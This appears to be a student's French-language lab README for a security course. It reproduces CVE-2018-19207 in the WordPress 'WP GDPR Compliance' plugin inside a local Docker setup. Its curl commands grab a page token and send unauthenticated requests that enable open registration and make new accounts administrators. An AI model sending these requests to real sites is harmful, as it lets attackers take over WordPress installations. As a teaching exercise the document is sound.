# SDSI

Devoir 2 - Faille CVE-2018-19207

## Démarrer les containers

```
docker-compose up
```

## Configuration de wordpress

1. Se connecter au site via `http://localhost:8000/`

2. Créer le compte administrateur en suivant les instructions (N.B : Attention l'adresse mail n'a pas besoin d'être correcte mais son format doit l'être !)

3. Activer le plugin "WP GDPR Compliance" via `http://localhost:8000/wp-admin/plugins.php` puis "Activate"

## Exploitation de la faille

### 1. Se connecter sur le home du site

- Requête GET à `http://localhost:8000/` pour obtenir le token `ajaxSecurity` utilisé par le plugin (copier les quelques caractères composant le token)

```
curl -X GET http://localhost:8000/ | grep "ajaxSecurity"
```

### 2. Autoriser la création de nouveaux utilisateurs

Tentez de créer un nouveau compte à l'adresse `http://localhost:8000/wp-login.php?action=register`.

On peut voir le message d'erreur suivant "User registration is currently not allowed." Nous allons modifier les paramètres Wordpress afin d'autoriser la création de nouveaux comptes.

- Requête POST à `http://localhost:8000/wp-admin/admin-ajax.php`
- Paramètres: `action=wpgdprc_process_action&security=AJAXSECURITYTOKEN&data ={"type": "save_setting", "append": "false", "option": "users_can_register", "value": "1"}`

```
curl -H "Content-Type: application/x-www-form-urlencoded" -d "action=wpgdprc_process_action&security=AJAXSECURITYTOKEN&data=%7B%22type%22%3A%22save_setting%22%2C%22append%22%3Afalse%2C%22option%22%3A%22users_can_register%22%2C%22value%22%3A%221%22%7D" -X POST http://localhost:8000/wp-admin/admin-ajax.php
```

En accédant à nouveau à `http://localhost:8000/wp-login.php?action=register`, on peut désormais créer un nouveau compte sur le site.

### 3. Obtenir les droits administateur

On souhaite désormais que les nouveaux comptes créés aient les droits administrateur par défaut.

- Requête POST à `http://localhost:8000/wp-admin/admin-ajax.php`
- Paramètres: `action=wpgdprc_process_action&security=AJAXSECURITYTOKEN&data ={"type": "save_setting", "append": "false","option": "default_role", "value": "administrator"}`

```
curl -H "Content-Type: application/x-www-form-urlencoded" -d "action=wpgdprc_process_action&security=AJAXSECURYTOKEN&data=%7B%22type%22%3A%22save_setting%22%2C%22append%22%3Afalse%2C%22option%22%3A%22default_role%22%2C%22value%22%3A%22administrator%22%7D" -X POST http://localhost:8000/wp-admin/admin-ajax.php
```

### 4. Obtenir un compte administrateur

Créez-vous un nouveau compte `http://localhost:8000/wp-login.php?action=register`. On vous demande ensuite de vérifier votre adresse mail. Ignorez cette demande (le site n'est pas configuré pour envoyer des mails) et Connectez vous via `http://localhost:8000/wp-login.php` avec le compte admin initial.

Dans l'onglet "Users", vous pourrez voir le nouveau compte que vous avez créé avec le rôle "Administrator". Vous pouvez aussi vérifier dans l'onglet "Settings" > "General" les paramètres "Membership" (la case "Anyone can register" devrait être cochée) et "New User Default Role" (à "Administrator").
